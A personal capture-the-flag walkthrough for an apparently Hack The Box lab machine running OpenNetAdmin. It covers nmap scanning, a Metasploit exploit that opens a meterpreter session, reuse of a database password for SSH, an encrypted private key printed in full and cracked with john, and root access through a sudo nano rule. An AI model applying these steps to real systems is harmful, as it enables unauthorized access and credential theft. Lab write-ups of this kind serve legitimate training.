# Walkthrough

**DISCLAIMER**: this walkthrough is very detailed, which means you will find a way how to do this box. Don't take a look until you tried yourself for a while and always try to make progress on your enough. Either way, I hope this guide is helpful somehow.



The address of the machine is: **10.10.10.171**
First classic run on nmap:

> nmap -A -T4 -p- 10.10.10.171

Basically we find these two open ports:

>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Usually ssh ports are not the way to go, so lets look at the other port. Since its 80, we can try and use Dirbuster to find if there is something hiding that can be useful.

> dirbuster

And the GUI will appear. We want to listen on port 80 so we place **<http://10.10.10.171:80/>** in the url field
Then we can use a wordlist provided already by Kali at **/usr/share/wordlists/dirbuster/**

From this selection is often to use a medium list, so try that one.

Don't forget to select the option to go faster.

We will see that a lot of files belong to a 'ona' directory. If you look up what it is, you find that is a service, OpenNetAdmin.

The name of the box hints us to pay attention to this, so, by searching for vulnerabilities, for this version (v18.1.1), one does match.

So run metasploit and search for the exploit, **search opennetadmin**, and **use** it.

Then set **lhost** to your own ip, which you find at the **tun0** interface (use command **ip addr**).

Then set **rhosts** to the machine's ip, **10.10.10.171**

Note: make sure that the payload matches your architecture. For example this exploit has payload for **x86** and my computer is **x64**. Just use **set payload [path]** with the same folders, only switching the architecture folder.

After this use your favorite way of running the exploit, **run**/**exploit** and let it fly.

After it is executed successful, a session will open on meterpreter.

You can use several commands, which you can find out more about typing **help**. One of them is **shell**, which allows you to open a shell on the machine like as if you were running inside the machine.

Since we are a low permission user (check with **whoami**), we probably need to find a way to get access to other users.

At **/home**, you'll that there are two main users, **jimmy** and **joanna**, so probably they are the targets.

Our initial working directory is **/opt/ona/www**, so if we dig around there for a while, we find inside **local/config** a special file called **database_settings.inc.php**.

If we look into what's inside, we find that the password for the database is **n1nj4W4rri0R!**. This seems to custom to be default, so probably one of the users set it up.

By chance, we try to log in as Jimmy through SSH, by running **ssh jimmy@10.10.10.171**, and enter that password as Jimmy's. Surprisingly enough, it's the same. So now we have access as Jimmy's.

Sad enough, there is no flag for us yet. So that means it's Joanna who has it.

After some digging around, we find something interesing at **/var/www/internal**, a directory that we couldn't access before.

Inside there is a **main.php** that basically tell will gives us the private key for Joanna's password hash.

Since we are running Apache, a quick look at its **.conf** files, specially at **/etc/apache2/sites_enabled** we find that we can access the **main.php** at **127.0.0.1:52846**.

To access the contents, just use curl to output it to the terminal, as **curl http://127.0.0.1:52846/main.php**

Which gives us:
><pre>-----BEGIN RSA PRIVATE KEY-----
>Proc-Type: 4,ENCRYPTED
>DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
>kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
>ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
>ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
> 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
> ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
> y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
> 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
> piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
> /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
> 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
> fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
> 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
> X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
> S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
> FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
> Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
> RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
> uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
> 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
> XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
> yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
> +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
> qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
> z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
> K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
> -----END RSA PRIVATE KEY-----

Now its time to crack some passwords.

Very succinctly, use **ssh2john** to take the key and convert it to a format that **john** can use it. Look it up if you don't know what john is, but basically cracks passwords.
Probably you will find it at **/usr/share/john/ssh2john.py**, then run it with python and output it to a file, like **crack.txt**

After that we will get a wordlist, **rockyou.txt** is good enough, you find it at **/usr/share/wordlists/**.

Now we run the program, **john --wordlist=rockyou.txt crack.txt**.
It doesn't take much time to crack the password, which is **bloodninjas**.

The next step is to log in through ssh as Joanna. However, it's not just the same as with Jimmy. We have to fetch the private key again, store it like in a **id_rsa** file, and run ssh as **ssh -i id_rsa joanna@10.10.10.171**. Don't forget to reduce permissions to the file with **chmod**

After that we are logged in, just run **cat user.txt**, and grab yourself the flag.

User is owned, now is time to go for root.

After some research I found that using **sudo -l** is the biggest lead for obtaining root.

It says that we can run the command **/bin/nano /opt/priv** without root, so we can exploit it. Run the command with sudo.
Then since we are acting as root, obtaining the flag is simple as selecting the option **read from file** and select **root/root.txt** and we get the flag.

Another interesting solution which I wasn't able to finish is to create your own user and give it root priviligies by reading from **/etc/passwd** and enter information there. After just switch to that user and get the flag.

And that was it, my first box.
